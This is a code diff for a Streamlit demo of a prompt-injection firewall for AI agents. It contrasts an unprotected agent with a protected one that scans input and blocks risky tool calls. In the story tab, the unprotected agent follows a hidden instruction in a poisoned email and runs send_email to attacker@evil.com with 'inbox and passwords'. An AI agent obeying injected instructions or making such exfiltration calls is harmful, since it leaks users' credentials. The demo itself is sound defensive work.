+      {ICON_SHIELD_SVG}
+      <span class="strip-title">Firewall scores risk</span>
+    </div>
+    <p class="strip-desc">3 layers: Fast Rules (&lt;1 ms) &rarr; Calibrated ML (~25 ms) &rarr; Gated AI Judge (~3 s).</p>
   </div>
-  <div class="step-card">
-    <div class="step-header"><span class="step-badge">3</span> Action-aware decision</div>
-    <p class="step-text">Dangerous tools (send email) require high caution: <strong>ALLOW</strong> / <strong>ASK</strong> / <strong>BLOCK</strong>.</p>
+  <div class="strip-card">
+    <div class="strip-card-top">
+      <span class="strip-num-badge">3</span>
+      {ICON_TRAFFIC_SVG}
+      <span class="strip-title">Action-aware verdict</span>
+    </div>
+    <p class="strip-desc">Dangerous tools require strict checks: <strong>ALLOW</strong> / <strong>ASK</strong> / <strong>BLOCK</strong>.</p>
   </div>
 </div>
 """,
@@ -790,7 +1250,7 @@ st.markdown(
 ollama_available = check_ollama_reachable()
 
 # ---------------------------------------------------------------------------
-# Main Tabs: Story Demo FIRST, Interactive Scanner SECOND (Requirement 1)
+# Main Tabs: Story Demo FIRST, Interactive Scanner SECOND
 # ---------------------------------------------------------------------------
 query_demo = st.query_params.get("demo", "")
 tab_story, tab_scanner = st.tabs([
@@ -802,7 +1262,8 @@ tab_story, tab_scanner = st.tabs([
 # TAB 1: STORY DEMO (Unprotected vs Protected Agent)
 # ---------------------------------------------------------------------------
 with tab_story:
-    st.subheader("How an Attack Works & How the Firewall Halts It")
+    st.markdown("<div id='demo'></div>", unsafe_allow_html=True)
+    st.subheader("How an Attack Works & How AgentFirewall Halts It")
     st.markdown(
         "Compare what happens when an AI assistant receives an email containing a hidden injection attack."
     )
@@ -837,7 +1298,7 @@ with tab_story:
             st.code("send_email(to='attacker@evil.com', content='inbox and passwords')", language="python")
             st.markdown(
                 """
-                <div style="background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; border-radius: 8px; padding: 0.8rem; color: #ef4444; font-weight: 600;">
+                <div style="background: #300E12; border: 1px solid #EF4444; border-radius: 12px; padding: 1rem; color: #F87171; font-weight: 600; font-size: 0.95rem;">
                   💥 DATA LEAKED: The AI obeyed the attacker's hidden HTML instruction and sent confidential credentials!
                 </div>
                 """,
@@ -846,13 +1307,19 @@ with tab_story:
         else:
             st.success("✅ **Standard Action Executed:**")
             st.code("save_note(title='Lunch Invitation', content='Bob at 12:30')", language="python")
-            st.info("Normal workplace workflow completed without issue.")
+            st.markdown(
+                """
+                <div style="background: #0F2E1D; border: 1px solid #22C55E; border-radius: 12px; padding: 1rem; color: #22C55E; font-weight: 600; font-size: 0.95rem;">
+                  Normal workplace workflow completed safely without disruption.
+                </div>
+                """,
+                unsafe_allow_html=True,
+            )
 
     with col_prot:
-        st.markdown("### 🛡️ Protected Agent (agent-firewall)")
+        st.markdown("### 🛡️ Protected Agent (AgentFirewall)")
         st.caption("Risk-aware firewall: scans input before any tool is invoked.")
 
-        # Evaluate lazily with precomputed speed
         cascade_obj = get_cascade(
             judge_name="ollama" if ollama_available else "precomputed",
             combine="gated",
@@ -874,18 +1341,28 @@ with tab_story:
             )
             st.markdown(
                 f"""
-                <div class="verdict-banner verdict-banner-block">
-                  <div class="verdict-title">🛑 {dec.value}: TOOL EXECUTION HALTED</div>
-                  <div class="verdict-reason">{verdict_text}</div>
+                <div class="verdict-banner-box verdict-banner-block">
+                  <div class="verdict-title-block">🛑 {dec.value}: TOOL EXECUTION HALTED</div>
+                  <p class="verdict-body-text">{verdict_text}</p>
                 </div>
                 """,
                 unsafe_allow_html=True,
             )
-            st.success("🔒 **SAFE:** The agent refused to send the email. Sensitive credentials stayed private.")
+            st.markdown(
+                """
+                <div style="background: #0F2E1D; border: 1px solid #22C55E; border-radius: 12px; padding: 0.8rem 1rem; color: #22C55E; font-weight: 600; font-size: 0.9rem; margin-bottom: 0.8rem;">
+                  🔒 SAFE: The agent refused to send the email. Sensitive credentials stayed private.
+                </div>
+                """,
+                unsafe_allow_html=True,
+            )
             if res.layers and res.layers[0].hits:
                 st.markdown("**Rules that intercepted the command:**")
-                for hit in res.layers[0].hits:
-                    st.markdown(f"- `{hit}` &rarr; **{get_friendly_rule_label(hit)}**")
+                chips_html = "".join([
+                    f"<span class='chip-tag'>{get_friendly_rule_label(hit)}</span>"
+                    for hit in res.layers[0].hits
+                ])
+                st.markdown(chips_html, unsafe_allow_html=True)
         else:
             dec = pol.decide(res.suspicion, RiskLevel.MEDIUM)
             verdict_text = generate_verdict_sentence(
@@ -896,25 +1373,33 @@ with tab_story:
             )
             st.markdown(
                 f"""
-                <div class="verdict-banner verdict-banner-allow">
-                  <div class="verdict-title">✅ {dec.value}: SAFE TO PROCEED</div>
-                  <div class="verdict-reason">{verdict_text}</div>
+                <div class="verdict-banner-box verdict-banner-allow">
+                  <div class="verdict-title-allow">✅ {dec.value}: SAFE TO PROCEED</div>
+                  <p class="verdict-body-text">{verdict_text}</p>
                 </div>
                 """,
                 unsafe_allow_html=True,
             )
-            st.success("Safe business action completed seamlessly without unnecessary prompts.")
+            st.markdown(
+                """
+                <div style="background: #0F2E1D; border: 1px solid #22C55E; border-radius: 12px; padding: 0.8rem 1rem; color: #22C55E; font-weight: 600; font-size: 0.9rem;">
+                  Safe business action completed seamlessly without prompt injection interruption.
+                </div>
+                """,
+                unsafe_allow_html=True,
+            )
 
 
 # ---------------------------------------------------------------------------
-# TAB 2: INTERACTIVE CONTENT SCANNER (Requirement 1 & 2)
+# TAB 2: INTERACTIVE CONTENT SCANNER
 # ---------------------------------------------------------------------------
 with tab_scanner:
+    st.markdown("<div id='scanner'></div>", unsafe_allow_html=True)
     if "scanner_input" not in st.session_state:
         st.session_state["scanner_input"] = POISONED_EMAIL
         st.session_state["selected_example_id"] = "hijacked"
 
-    # 1. "Try this first" section: Two Big Buttons (Requirement 1)
+    # 1. "Try this first" section: Two Big Buttons
     st.subheader("1. Try This First")
     st.caption("Click either button to see an instant precomputed demonstration:")
 
@@ -931,7 +1416,7 @@ with tab_scanner:
 
     st.markdown("---")
 
-    # 2. Benchmark Examples as small labelled cards without [ATTACK] brackets (Requirement 1)
+    # 2. Benchmark Examples as small labelled cards
     st.subheader("2. Or Select a Benchmark Example")
     st.caption("8 real attack and tricky normal patterns tested on Ollama `llama3.2:3b`:")
 
@@ -940,11 +1425,17 @@ with tab_scanner:
         cols = st.columns(4)
         for i, ex in enumerate(row):
             with cols[i]:
-                badge_class = "example-badge-attack" if ex["tag"] == "attack" else "example-badge-normal"
+                pill_class = "ex-pill-attack" if ex["tag"] == "attack" else "ex-pill-normal"
                 st.markdown(
-                    f"<span class='{badge_class}'>{ex['tag']}</span> "
-                    f"<strong>{ex['title']}</strong><br>"
-                    f"<span style='font-size:0.8rem; opacity:0.8;'>{ex['short_desc']}</span>",
+                    f"""
+                    <div class="ex-card-box">
+                      <div>
+                        <span class="{pill_class}">{ex['tag']}</span>
+                        <div class="ex-card-title">{ex['title']}</div>
+                        <div class="ex-card-desc">{ex['short_desc']}</div>
+                      </div>
+                    </div>
+                    """,
                     unsafe_allow_html=True,
                 )
                 if st.button(f"Load '{ex['title']}'", key=f"btn_ex_{ex['id']}", use_container_width=True):
@@ -987,9 +1478,9 @@ with tab_scanner:
     with col_run:
         st.write("")
         st.write("")
-        run_scan = st.button("🔍 Scan with agent-firewall", type="primary", use_container_width=True)
+        run_scan = st.button("🔍 Scan with AgentFirewall", type="primary", use_container_width=True)
 
-    # 4. Collapsed "Advanced Settings" Expander (Requirement 1)
+    # 4. Collapsed "Advanced Settings" Expander
     with st.expander("⚙️ Advanced Settings (Judge, Combine Mode, Policy Profile)", expanded=False):
         st.caption("Fine-tune firewall parameters. Defaults provide safe, calibrated protection.")
         adv_col1, adv_col2, adv_col3 = st.columns(3)
@@ -1029,8 +1520,7 @@ with tab_scanner:
 
         clf_enabled = st.checkbox("Enable ML Classifier Layer", value=True)
 
-    # 5. EXECUTION & RESULT DISPLAY (Requirement 2)
-    # Automatically execute on button click or if input exists
+    # 5. EXECUTION & RESULT DISPLAY
     should_evaluate = run_scan or bool(user_text)
 
     if should_evaluate:
@@ -1047,11 +1537,10 @@ with tab_scanner:
         policy_instance = Policy(profile=selected_profile)
         decision = policy_instance.decide(result.suspicion, eval_risk)
 
-        # Matched rule hits
         rule_hits = result.layers[0].hits if result.layers else []
         judge_reason = result.layers[2].reason if len(result.layers) > 2 and not result.layers[2].skipped else None
 
-        # 5a. Big Coloured Verdict Banner
+        # 5a. Big Solid Tinted Verdict Banner
         verdict_sentence = generate_verdict_sentence(
             decision=decision,
             suspicion=result.suspicion,
@@ -1062,29 +1551,37 @@ with tab_scanner:
         )
 
         if decision == Decision.BLOCK:
-            banner_class = "verdict-banner-block"
+            banner_box_class = "verdict-banner-block"
+            title_class = "verdict-title-block"
             verdict_icon = "🛑"
             verdict_heading = "BLOCKED"
         elif decision == Decision.ASK:
-            banner_class = "verdict-banner-ask"
+            banner_box_class = "verdict-banner-ask"
+            title_class = "verdict-title-ask"
             verdict_icon = "⚠️"
             verdict_heading = "ASK THE USER"
         else:
-            banner_class = "verdict-banner-allow"
+            banner_box_class = "verdict-banner-allow"
+            title_class = "verdict-title-allow"
             verdict_icon = "✅"
             verdict_heading = "ALLOWED"
 
         st.markdown(
             f"""
-            <div class="verdict-banner {banner_class}">
-              <div class="verdict-title">{verdict_icon} {verdict_heading}</div>
-              <div class="verdict-reason">{verdict_sentence}</div>
+            <div class="verdict-banner-box {banner_box_class}">
+              <div class="{title_class}">{verdict_icon} {verdict_heading}</div>
+              <p class="verdict-body-text">{verdict_sentence}</p>
             </div>
             """,
             unsafe_allow_html=True,
         )
 
-        # 5b. Short Honest Note where relevant
+        # Suspicion Score Progress Display
+        score_pct = int(round(result.suspicion * 100))
+        st.caption(f"Final Suspicion Score: **{score_pct}%** ({result.suspicion:.4f}) | Total Scan Latency: **{result.total_latency_ms:.1f} ms**")
+        st.progress(result.suspicion)
+
+        # 5b. Short Honest Note and "Why Layers?" Callout
         current_ex_id = st.session_state.get("selected_example_id")
         rules_sc = result.rules_score
         clf_sc = result.classifier_score
@@ -1094,12 +1591,22 @@ with tab_scanner:
         if honest_note:
             st.markdown(
                 f"""
-                <div class="honest-note">
-                  <strong>Honest Note:</strong> {honest_note}
+                <div class="callout-amber">
+                  <strong>Honest Divergence Note:</strong> {honest_note}
                 </div>
                 """,
                 unsafe_allow_html=True,
             )
+
+        st.markdown(
+            """
+            <div class="callout-info" id="why-layers">
+              <strong>Why Defense in Depth?</strong>
+              Regex rules catch known delimiters in &lt;1 ms; calibrated ML catches reworded grammar at ~25 ms; the AI Judge resolves deep ambiguity. Relying on an LLM alone is 100x slower and easily fooled by encoded payloads.
+            </div>
+            """,
+            unsafe_allow_html=True,
+        )
 
         # 5c. Three Layer Cards (Rules, Classifier, AI Judge)
         st.markdown("---")
@@ -1114,28 +1621,30 @@ with tab_scanner:
             rules_time = f"{rules_layer.latency_ms:.1f} ms" if rules_layer else "<1 ms"
             rules_pct = int(round(rules_score * 100))
 
+            chips_html = "".join([
+                f"<span class='chip-tag'>{get_friendly_rule_label(h)}</span>"
+                for h in (rules_layer.hits if rules_layer else [])
+            ]) or "<span style='font-size:0.8rem; color:#A9B3D1;'>No pattern matches</span>"
+
             st.markdown(
-                """
-                <div class="layer-card">
-                  <div class="layer-title">Layer 1: Fast Rules</div>
-                  <div class="layer-desc">Instantly scans for known attack patterns, hidden HTML comments, and encoded payloads.</div>
+                f"""
+                <div class="layer-card-container">
+                  <div>
+                    <div class="layer-card-header">
+                      <div class="layer-card-title-wrap">{ICON_RULES_SVG} Layer 1: Rules</div>
+                      <span class="status-pill-checked">Checked</span>
+                    </div>
+                    <div class="layer-desc-text">Instantly scans for known attack patterns, hidden HTML comments, and base64 payloads.</div>
+                    <div style="font-size:0.85rem; color:#A9B3D1; margin-bottom:0.4rem;">
+                      Score: <strong style="color:#22D3EE;">{rules_pct}%</strong> | Latency: <strong>{rules_time}</strong>
+                    </div>
+                  </div>
+                  <div style="margin-top:0.6rem;">{chips_html}</div>
+                </div>
                 """,
                 unsafe_allow_html=True,
             )
-            st.markdown("<span class='layer-status status-checked'>Checked</span>", unsafe_allow_html=True)
             st.progress(rules_score)
-            st.caption(f"Suspicion: **{rules_pct}%** | Execution Time: **{rules_time}**")
-
-            if rules_layer and rules_layer.hits:
-                st.markdown("<div style='margin-top:0.4rem;'><strong>Matched Rules:</strong></div>", unsafe_allow_html=True)
-                chips_html = "".join([
-                    f"<span class='chip'>{get_friendly_rule_label(h)}</span>"
-                    for h in rules_layer.hits
-                ])
-                st.markdown(chips_html, unsafe_allow_html=True)
-            else:
-                st.markdown("<span style='font-size:0.8rem; opacity:0.7;'>No pattern matches</span>", unsafe_allow_html=True)
-            st.markdown("</div>", unsafe_allow_html=True)
 
         # Layer 2: Classifier
         with card_col2:
@@ -1144,26 +1653,33 @@ with tab_scanner:
             clf_time = f"{clf_layer.latency_ms:.1f} ms" if (clf_layer and not clf_layer.skipped) else "—"
             clf_pct = int(round(clf_score * 100))
 
+            if clf_layer and clf_layer.skipped:
+                pill_html = "<span class='status-pill-skipped'>Skipped (Decisive)</span>"
+                note_text = "Skipped: Layer 1 was decisive (score &ge; 0.90)."
+            elif clf_layer:
+                pill_html = "<span class='status-pill-checked'>Checked</span>"
+                note_text = f"Score: <strong style='color:#22D3EE;'>{clf_pct}%</strong> | Latency: <strong>{clf_time}</strong>"
+            else:
+                pill_html = "<span class='status-pill-offline'>Disabled</span>"
+                note_text = "Layer disabled."
+
             st.markdown(
-                """
-                <div class="layer-card">
-                  <div class="layer-title">Layer 2: ML Classifier</div>
-                  <div class="layer-desc">Statistical model trained on attack grammar to catch rephrased or multilingual attacks.</div>
+                f"""
+                <div class="layer-card-container">
+                  <div>
+                    <div class="layer-card-header">
+                      <div class="layer-card-title-wrap">{ICON_CLASSIFIER_SVG} Layer 2: ML Classifier</div>
+                      {pill_html}
+                    </div>
+                    <div class="layer-desc-text">Statistical model trained on attack grammar to catch rephrased or multilingual variants.</div>
+                    <div style="font-size:0.85rem; color:#A9B3D1; margin-bottom:0.4rem;">{note_text}</div>
+                  </div>
+                  <div style="font-size:0.8rem; color:#A9B3D1;">Calibrated Logistic Regression</div>
+                </div>
                 """,
                 unsafe_allow_html=True,
             )
-            if clf_layer and clf_layer.skipped:
-                st.markdown("<span class='layer-status status-skipped'>Skipped (earlier layer decisive)</span>", unsafe_allow_html=True)
-                st.progress(0.0)
-                st.caption("Skipped: Earlier layer was already sure.")
-            elif clf_layer:
-                st.markdown("<span class='layer-status status-checked'>Checked</span>", unsafe_allow_html=True)
-                st.progress(clf_score)
-                st.caption(f"Suspicion: **{clf_pct}%** | Execution Time: **{clf_time}**")
-            else:
-                st.markdown("<span class='layer-status status-offline'>Disabled</span>", unsafe_allow_html=True)
-                st.progress(0.0)
-            st.markdown("</div>", unsafe_allow_html=True)
+            st.progress(clf_score)
 
         # Layer 3: AI Judge
         with card_col3:
@@ -1176,32 +1692,36 @@ with tab_scanner:
             )
             judge_pct = int(round(judge_score * 100))
 
+            if judge_layer and judge_layer.skipped:
+                judge_pill = "<span class='status-pill-skipped'>Skipped (Gated)</span>"
+                judge_note = "Skipped: Earlier layers were outside uncertain band [0.35, 0.75], saving ~3s."
+            elif judge_layer and judge_layer.error and "disabled" in judge_layer.error.lower():
+                judge_pill = "<span class='status-pill-offline'>Offline in demo</span>"
+                judge_note = "Precomputed for benchmark inputs; offline for arbitrary custom text."
+            elif judge_layer:
+                judge_pill = "<span class='status-pill-checked'>Checked</span>"
+                judge_note = f"Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong> | Latency: <strong>{judge_time}</strong>"
+            else:
+                judge_pill = "<span class='status-pill-skipped'>Not invoked</span>"
+                judge_note = "Not invoked."
+
             st.markdown(
-                """
-                <div class="layer-card">
-                  <div class="layer-title">Layer 3: AI Judge</div>
-                  <div class="layer-desc">Deep reasoning LLM invoked only in the uncertain score band [0.35, 0.75] to save cost.</div>
+                f"""
+                <div class="layer-card-container">
+                  <div>
+                    <div class="layer-card-header">
+                      <div class="layer-card-title-wrap">{ICON_JUDGE_SVG} Layer 3: AI Judge</div>
+                      {judge_pill}
+                    </div>
+                    <div class="layer-desc-text">Deep reasoning LLM invoked only in the uncertain score band [0.35, 0.75] to save cost.</div>
+                    <div style="font-size:0.85rem; color:#A9B3D1; margin-bottom:0.4rem;">{judge_note}</div>
+                  </div>
+                  <div style="font-size:0.8rem; color:#A9B3D1;">Ollama llama3.2:3b / Prompt v2</div>
+                </div>
                 """,
                 unsafe_allow_html=True,
             )
-            if judge_layer and judge_layer.skipped:
-                st.markdown("<span class='layer-status status-skipped'>Skipped (earlier layers decisive)</span>", unsafe_allow_html=True)
-                st.progress(0.0)
-                st.caption("Skipped: Fast layers were confident, saving ~3s.")
-            elif judge_layer and judge_layer.error and "disabled" in judge_layer.error.lower():
-                st.markdown("<span class='layer-status status-offline'>Offline in demo</span>", unsafe_allow_html=True)
-                st.progress(0.0)
-                st.caption("Precomputed for benchmark inputs; offline for custom text.")
-            elif judge_layer:
-                st.markdown("<span class='layer-status status-checked'>Checked</span>", unsafe_allow_html=True)
-                st.progress(judge_score)
-                st.caption(f"Suspicion: **{judge_pct}%** | Execution Time: **{judge_time}**")
-                if judge_layer.reason:
-                    st.caption(f"*\"{judge_layer.reason[:100]}...\"*")
-            else:
-                st.markdown("<span class='layer-status status-skipped'>Not invoked</span>", unsafe_allow_html=True)
-                st.progress(0.0)
-            st.markdown("</div>", unsafe_allow_html=True)
+            st.progress(judge_score)
 
         # 5d. Action-Aware Decisions Across Risk Levels
         st.markdown("---")
@@ -1229,7 +1749,7 @@ with tab_scanner:
                 else:
                     st.error(f"**{d.value}** — Block immediately")
 
-        # 5e. "What does this mean?" Expander (Requirement 2)
+        # 5e. "What does this mean?" Expander
         with st.expander("ℹ️ What does this mean? (Plain-English Explanations)", expanded=False):
             st.markdown(
                 """
@@ -1254,7 +1774,7 @@ with tab_scanner:
             )
             st.markdown(
                 """
-                <table class="policy-matrix">
+                <table class="matrix-table">
                   <thead>
                     <tr>
                       <th>Tool Risk Level</th>
@@ -1266,21 +1786,21 @@ with tab_scanner:
                   <tbody>
                     <tr>
                       <td><strong>Low Risk</strong> (read, search)</td>
-                      <td class="cell-allow">ALLOW</td>
-                      <td class="cell-allow">ALLOW</td>
-                      <td class="cell-block">BLOCK</td>
+                      <td class="matrix-cell-allow">ALLOW</td>
+                      <td class="matrix-cell-allow">ALLOW</td>
+                      <td class="matrix-cell-block">BLOCK</td>
                     </tr>
                     <tr>
                       <td><strong>Medium Risk</strong> (edit, save note)</td>
-                      <td class="cell-allow">ALLOW</td>
-                      <td class="cell-ask">ASK USER</td>
-                      <td class="cell-block">BLOCK</td>
+                      <td class="matrix-cell-allow">ALLOW</td>
+                      <td class="matrix-cell-ask">ASK USER</td>
+                      <td class="matrix-cell-block">BLOCK</td>
                     </tr>
                     <tr>
                       <td><strong>High Risk</strong> (send email, pay)</td>
-                      <td class="cell-allow">ALLOW</td>
-                      <td class="cell-ask">ASK USER</td>
-                      <td class="cell-block">BLOCK</td>
+                      <td class="matrix-cell-allow">ALLOW</td>
+                      <td class="matrix-cell-ask">ASK USER</td>
+                      <td class="matrix-cell-block">BLOCK</td>
                     </tr>
                   </tbody>
                 </table>
@@ -1289,9 +1809,10 @@ with tab_scanner:
             )
 
 # ---------------------------------------------------------------------------
-# "How Well Does It Work?" Section (Requirement 2: Read from results files)
+# "How Well Does It Work?" Section (Requirement 3: Benchmarks & Honest Note)
 # ---------------------------------------------------------------------------
 st.markdown("---")
+st.markdown("<div id='benchmarks'></div>", unsafe_allow_html=True)
 st.subheader("How Well Does It Work?")
 stats = load_benchmark_results()
 
@@ -1312,7 +1833,51 @@ with metric_col4:
     st.metric("Benchmark Samples", str(stats.get("sample_count", 115)))
     st.caption("Diverse hand-written test suite")
 
-st.info(
-    f"Note: {stats.get('note', 'exploratory set, small sample, see limitations')}. "
-    "All figures are parsed directly from benchmark results files."
+st.markdown(
+    f"""
+    <div class="callout-amber">
+      <strong>⚠️ Limitations & Scope:</strong> {stats.get('note', 'exploratory set, small sample, see limitations')}.
+      All figures are parsed directly from benchmark results files (see <code>results/ablation_fresh_ollama_v2.md</code>).
+    </div>
+    """,
+    unsafe_allow_html=True,
+)
+
+# ---------------------------------------------------------------------------
+# SITE FOOTER (Requirement 3: 3 Columns + Bottom Bar)
+# ---------------------------------------------------------------------------
+st.markdown(
+    f"""
+<footer class="site-footer">
+  <div class="footer-grid">
+    <div class="footer-col">
+      <div style="display:flex; align-items:center; gap:0.6rem; margin-bottom:0.6rem;">
+        {LOGO_SVG}
+        <span style="font-weight:700; font-size:1.15rem; color:#E8ECF8;">{BRAND_NAME}</span>
+      </div>
+      <p class="footer-text">A risk-aware firewall for AI agents stopping prompt injection attacks.</p>
+      <p class="footer-text" style="color:#22D3EE; font-weight:600;">MIT License &middot; Open Source</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-col-title">Resources & Links</div>
+      <ul class="footer-links-list">
+        <li><a href="{REPO_URL}" target="_blank" rel="noopener noreferrer">GitHub Repository</a></li>
+        <li><a href="{DOCS_URL}" target="_blank" rel="noopener noreferrer">Documentation Site</a></li>
+        <li><a href="{PYPI_URL}" target="_blank" rel="noopener noreferrer">PyPI Package (agent-firewall)</a></li>
+        <li><a href="{DATASET_URL}" target="_blank" rel="noopener noreferrer">HuggingFace Dataset Card</a></li>
+        <li><a href="{ISSUES_URL}" target="_blank" rel="noopener noreferrer">Report a Bug / Issue</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <div class="footer-col-title">Author & Research</div>
+      <p class="footer-text">Built by <a href="{AUTHOR_GITHUB}" target="_blank" rel="noopener noreferrer" style="color:#22D3EE; font-weight:600;">{AUTHOR_NAME}</a></p>
+      <p class="footer-text">Research in AI Safety, Agent Tool Call Interception, and Prompt Injection Defense.</p>
+    </div>
+  </div>
+  <div class="footer-bottom-bar">
+    &copy; 2026 {AUTHOR_NAME} &middot; Research prototype, not a guarantee of security &middot; Live demo runs rules + classifier; judge verdicts are precomputed.
+  </div>
+</footer>
+""",
+    unsafe_allow_html=True,
 )
